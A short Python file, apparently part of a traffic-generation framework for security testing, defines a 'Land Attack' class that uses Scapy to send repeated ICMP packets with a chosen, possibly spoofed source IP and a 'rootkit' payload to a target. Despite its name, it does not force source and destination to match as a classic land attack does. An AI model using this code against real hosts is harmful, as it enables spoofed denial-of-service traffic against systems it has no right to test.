import time

from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send

from attack.attack_traffic_generate import Attack
import threading


class LandAttack(Attack):
    def __init__(self, source_ip, destination_ip, packet_count, interface):
        super().__init__()
        self.type = "Land Attack"
        self.source_ip = source_ip
        self.destination_ip = destination_ip
        self.packet_count = packet_count
        self.interface = interface
        print(self.source_ip, self.destination_ip)

    def startGenerateTraffic(self):
        packet = IP(src=self.source_ip, dst=self.destination_ip) / ICMP() / b'rootkit'
        for i in range(self.packet_count):
            send(packet, iface=self.interface)
            # wait for a while
            time.sleep(0.1)

    def start(self):
        threading.Thread(target=self.startGenerateTraffic).start()
